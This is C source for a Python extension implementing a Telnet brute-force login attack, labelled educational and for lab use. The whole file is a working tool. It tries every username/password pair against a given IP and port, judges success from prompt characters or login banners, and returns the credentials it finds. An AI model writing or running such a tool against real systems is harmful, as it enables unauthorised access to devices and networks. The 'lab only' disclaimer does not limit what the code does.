/*
 * Fast Telnet Brute Force C Extension - Windows Compatible
 * Educational Purpose Only - For Controlled Lab Environment
 */

#include <Python.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#define sleep(x) Sleep((x) * 1000)
typedef HANDLE pthread_t;
typedef HANDLE pthread_mutex_t;
#define pthread_mutex_init(m, a) (*(m) = CreateMutex(NULL, FALSE, NULL))
#define pthread_mutex_lock(m) WaitForSingleObject(*(m), INFINITE)
#define pthread_mutex_unlock(m) ReleaseMutex(*(m))
#define pthread_mutex_destroy(m) CloseHandle(*(m))
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/select.h>
#include <fcntl.h>
#endif

#define MAX_THREADS 50
#define BUFFER_SIZE 1024
#define DEFAULT_TIMEOUT 5

typedef struct {
    char target_ip[16];
    int port;
    char* username;
    char* password;
    int* result_found;
    pthread_mutex_t* result_mutex;
    char* success_credentials;
} telnet_thread_data;

static int winsock_initialized = 0;

// Initialize Winsock on Windows
static int init_networking() {
#ifdef _WIN32
    if (!winsock_initialized) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return -1;
        }
        winsock_initialized = 1;
    }
#endif
    return 0;
}

// Cleanup Winsock on Windows
static void cleanup_networking() {
#ifdef _WIN32
    if (winsock_initialized) {
        WSACleanup();
        winsock_initialized = 0;
    }
#endif
}

// Cross-platform thread creation
#ifdef _WIN32
typedef DWORD (WINAPI *thread_func_t)(LPVOID);
static int create_thread(pthread_t* thread, void* attr, void* (*start_routine)(void*), void* arg) {
    *thread = CreateThread(NULL, 0, (thread_func_t)start_routine, arg, 0, NULL);
    return (*thread == NULL) ? -1 : 0;
}

static int join_thread(pthread_t thread, void** retval) {
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    return 0;
}
#else
#define create_thread pthread_create
#define join_thread pthread_join
#endif

// Set socket timeout
static int set_socket_timeout(int sockfd, int timeout_sec) {
#ifdef _WIN32
    DWORD timeout = timeout_sec * 1000;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
        return -1;
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
        return -1;
    }
#else
    struct timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
        return -1;
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) != 0) {
        return -1;
    }
#endif
    return 0;
}

// Fast telnet login attempt
static int try_telnet_login(const char* ip, int port, const char* username, const char* password) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char login_cmd[BUFFER_SIZE];
    int bytes_received;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    
    // Set timeout
    if (set_socket_timeout(sockfd, DEFAULT_TIMEOUT) != 0) {
        close(sockfd);
        return 0;
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return 0;
    }
    
    // Connect
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return 0;
    }
    
    // Receive initial banner/prompt
    bytes_received = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) {
        close(sockfd);
        return 0;
    }
    buffer[bytes_received] = '\0';
    
    // Send username
    snprintf(login_cmd, sizeof(login_cmd), "%s\r\n", username);
    if (send(sockfd, login_cmd, strlen(login_cmd), 0) < 0) {
        close(sockfd);
        return 0;
    }
    
    // Receive password prompt
    bytes_received = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) {
        close(sockfd);
        return 0;
    }
    buffer[bytes_received] = '\0';
    
    // Send password
    snprintf(login_cmd, sizeof(login_cmd), "%s\r\n", password);
    if (send(sockfd, login_cmd, strlen(login_cmd), 0) < 0) {
        close(sockfd);
        return 0;
    }
    
    // Receive response
    bytes_received = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) {
        close(sockfd);
        return 0;
    }
    buffer[bytes_received] = '\0';
    
    close(sockfd);
    
    // Check for successful login indicators
    if (strstr(buffer, "$") || strstr(buffer, "#") || strstr(buffer, ">") || 
        strstr(buffer, "Welcome") || strstr(buffer, "Last login")) {
        return 1;
    }
    
    return 0;
}

// Thread function for brute force attempts
#ifdef _WIN32
static DWORD WINAPI telnet_thread_worker(LPVOID arg) {
#else
static void* telnet_thread_worker(void* arg) {
#endif
    telnet_thread_data* data = (telnet_thread_data*)arg;
    
    // Check if result already found
    pthread_mutex_lock(data->result_mutex);
    if (*(data->result_found)) {
        pthread_mutex_unlock(data->result_mutex);
        return 0;
    }
    pthread_mutex_unlock(data->result_mutex);
    
    // Try login
    if (try_telnet_login(data->target_ip, data->port, data->username, data->password)) {
        pthread_mutex_lock(data->result_mutex);
        if (!*(data->result_found)) {
            *(data->result_found) = 1;
            snprintf(data->success_credentials, 256, "%s:%s", data->username, data->password);
        }
        pthread_mutex_unlock(data->result_mutex);
    }
    
    return 0;
}

// Main brute force function
static PyObject* fast_telnet_bruteforce(PyObject* self, PyObject* args) {
    const char* target_ip;
    int port;
    PyObject* username_list;
    PyObject* password_list;
    int max_threads = 20;
    
    if (!PyArg_ParseTuple(args, "siOO|i", &target_ip, &port, &username_list, &password_list, &max_threads)) {
        return NULL;
    }
    
    if (!PyList_Check(username_list) || !PyList_Check(password_list)) {
        PyErr_SetString(PyExc_TypeError, "Username and password lists must be Python lists");
        return NULL;
    }
    
    if (init_networking() != 0) {
        PyErr_SetString(PyExc_RuntimeError, "Failed to initialize networking");
        return NULL;
    }
    
    Py_ssize_t username_count = PyList_Size(username_list);
    Py_ssize_t password_count = PyList_Size(password_list);
    
    if (username_count == 0 || password_count == 0) {
        return Py_BuildValue("(ii)", 0, 0);
    }
    
    int result_found = 0;
    pthread_mutex_t result_mutex;
    char success_credentials[256] = {0};
    
    pthread_mutex_init(&result_mutex, NULL);
    
    // Limit concurrent threads
    if (max_threads > MAX_THREADS) {
        max_threads = MAX_THREADS;
    }
    
    int total_attempts = 0;
    int successful_attempts = 0;
    
    // Try all username/password combinations
    for (Py_ssize_t i = 0; i < username_count && !result_found; i++) {
        for (Py_ssize_t j = 0; j < password_count && !result_found; j++) {
            PyObject* username_obj = PyList_GetItem(username_list, i);
            PyObject* password_obj = PyList_GetItem(password_list, j);
            
            if (!PyUnicode_Check(username_obj) || !PyUnicode_Check(password_obj)) {
                continue;
            }
            
            const char* username = PyUnicode_AsUTF8(username_obj);
            const char* password = PyUnicode_AsUTF8(password_obj);
            
            if (!username || !password) {
                continue;
            }
            
            total_attempts++;
            
            // Create thread data
            telnet_thread_data thread_data;
            strncpy(thread_data.target_ip, target_ip, sizeof(thread_data.target_ip) - 1);
            thread_data.target_ip[sizeof(thread_data.target_ip) - 1] = '\0';
            thread_data.port = port;
            thread_data.username = (char*)username;
            thread_data.password = (char*)password;
            thread_data.result_found = &result_found;
            thread_data.result_mutex = &result_mutex;
            thread_data.success_credentials = success_credentials;
            
            pthread_t thread;
            if (create_thread(&thread, NULL, telnet_thread_worker, &thread_data) == 0) {
                join_thread(thread, NULL);
                
                if (result_found) {
                    successful_attempts = 1;
                    break;
                }
            }
            
            // Small delay to prevent overwhelming the target
            sleep(1);
        }
    }
    
    pthread_mutex_destroy(&result_mutex);
    cleanup_networking();
    
    if (successful_attempts) {
        return Py_BuildValue("(is)", successful_attempts, success_credentials);
    } else {
        return Py_BuildValue("(ii)", successful_attempts, 0);
    }
}

// Method definitions
static PyMethodDef FastTelnetMethods[] = {
    {"bruteforce", fast_telnet_bruteforce, METH_VARARGS, "Fast telnet brute force attack"},
    {NULL, NULL, 0, NULL}
};

// Module definition
static struct PyModuleDef fast_telnet_module = {
    PyModuleDef_HEAD_INIT,
    "fast_telnet_bruteforce",
    "Fast telnet brute force C extension",
    -1,
    FastTelnetMethods
};

// Module initialization
PyMODINIT_FUNC PyInit_fast_telnet_bruteforce(void) {
    return PyModule_Create(&fast_telnet_module);
}
